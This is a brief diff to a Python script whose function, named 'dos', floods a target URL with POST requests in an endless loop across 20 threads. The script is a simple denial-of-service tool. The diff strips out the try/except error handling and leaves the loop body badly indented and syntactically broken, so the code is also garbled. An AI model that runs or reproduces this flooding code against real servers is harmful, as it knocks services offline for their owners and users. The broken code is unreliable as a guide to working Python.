@@ -25,9 +25,7 @@ input("Press ENTER to continue ")
 print("")
 def dos(target):
     while True:
-        try:
-            res = requests.post(url, data={'requesting': '666666',})
-        except requests.exceptions.ConnectionError:
+            res = requests.post(url, data={'requesting': '666666',})        
 
 threads = 20
 
